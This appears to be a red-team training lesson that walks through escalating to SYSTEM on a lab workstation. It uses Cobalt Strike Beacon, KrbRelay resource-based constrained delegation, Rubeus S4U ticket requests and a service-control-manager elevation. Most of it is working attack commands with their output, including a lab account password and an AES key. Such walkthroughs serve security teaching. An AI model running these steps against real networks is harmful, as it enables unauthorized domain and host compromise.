This lesson will show how Kerberos relaying can be used to LPE to SYSTEM on WKSTN-2 as bfarmer.

One unfortunate aspect to KrbRelay is that because it uses the BouncyCastle Crypto package (which is quite large), its total compiled size is larger than the default task size allowed for Beacon. Trying to run it with execute-assembly will throw an error:

	beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe
	[-] Task size of 1727291 bytes is over the max task size limit of 1048576 bytes.

We could try and modify the tool to make it smaller or modify Beacon's task size to make it larger. The latter option is quite straightforward because it can controlled with the tasks_max_size setting in Malleable C2 - the downside is that it cannot be applied retrospectively to existing Beacons. To double the task size, add set tasks_max_size "2097152"; to the top of your C2 profile. You will notice significantly more lag within the CS client when executing tasks with large artifacts.

You must also remember to restart the team server and re-generate your payloads after making changes to the Malleable C2 profile.

### RBCD

As mentioned in the RBCD lesson, it is necessary to have control over another computer object to abuse. If available, the easiest way is to add your own computer object to the domain and get its SID.

	beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

	[?] Using DC    : dc-2.dev.cyberbotic.io
	    |_ Domain   : dev.cyberbotic.io
	    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
	    |_ Password : 2GsXwLNRAV30RIx
	
	[+] Machine account added to AD..
	
	beacon> powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid
	
	objectsid                                   
	---------                                   
	S-1-5-21-569305411-121244042-2357301523-9101

The next step is to find a suitable port for the OXID resolver to circumvent a check in the Remote Procedure Call Service (RPCSS). This can be done with CheckPort.exe.

	beacon> execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
	[*] Looking for available ports..
	[*] SYSTEM Is allowed through port 10
	
With that, run KrbRelay.

	beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10
	
Where:

- spn is the target service to relay to.
- clsid represents RPC_C_IMP_LEVEL_IMPERSONATE.
- rbcd is the SID of the fake computer account.
- port is the port returned by CheckPort.

[*] Relaying context: dev.cyberbotic.io\WKSTN-2$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Windows\system32\rundll32.exe
[*] Register com server
objref:TUVPVw[...snip...]AAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 90f18417-f0f1-484e-9d3c-59dceee5dbd8

[*] apReq: 608206[...snip...]f3f91c
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8187[...snip...]66ea24
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b30[...snip...]c15bae
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS

If we query WKSTN-2$, we'll see that there's now an entry in in its msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

	beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
	
	msds-allowedtoactonbehalfofotheridentity
	----------------------------------------
	{1, 0, 4, 128...}
	
Because we have the password associated with EvilComputer, we can request a TGT and perform an S4U to obtain a usable service tickets for WKSTN-2.  Let's use this to get a ticket for HOST/WKSTN-2.

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap
	
	[*] Action: Ask TGT
	
	[*] Using aes256_cts_hmac_sha1 hash: 1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A
	[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
	[*] Using domain controller: 10.10.122.10:88
	[+] TGT request successful!
	[*] base64(ticket.kirbi):

	doIF8j[...snip...]MuaW8=

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket:doIF8j[...snip...]MuaW8= /ptt

	[*] Action: S4U
	
	[*] Building S4U2self request for: 'EvilComputer$@DEV.CYBERBOTIC.IO'
	[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
	[*] Sending S4U2self request to 10.10.122.10:88
	[+] S4U2self success!
	[*] Got a TGS for 'Administrator' to 'EvilComputer$@DEV.CYBERBOTIC.IO'
	[*] base64(ticket.kirbi):
	
	doIFzj[...snip...]RlciQ=
	
	[*] Impersonating user 'Administrator' to target SPN 'host/wkstn-2'
	[*] Building S4U2proxy request for service: 'host/wkstn-2'
	[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
	[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
	[+] S4U2proxy success!
	[*] base64(ticket.kirbi) for SPN 'host/wkstn-2':
	
	doIGej[...snip...]N0bi0y
	
	[+] Ticket successfully imported!

Notice how this is one occasion where we do not use the FQDN of the target machine in the msdsspn parameter.

To perform the elevation, we'll use this ticket to interact with the local Service Control Manager over Kerberos to create and start a service binary payload.  To streamline this, I've created a BOF and Aggressor Script that registers a new elevate command in Beacon. It can be found in C:\Tools\SCMUACBypass and is based on James' SCMUACBypass gist.

	beacon> elevate svc-exe-krb tcp-local
	
	AcquireCredentialsHandleHook called for package Negotiate
	Changing to Kerberos package
	
	[+] received output:
	InitializeSecurityContext called for target HOST/127.0.0.1
	InitializeSecurityContext status = 00090312
	
	[+] received output:
	InitializeSecurityContext called for target HOST/127.0.0.1
	InitializeSecurityContext status = 00000000
	
	[+] established link to child beacon: 10.10.123.102























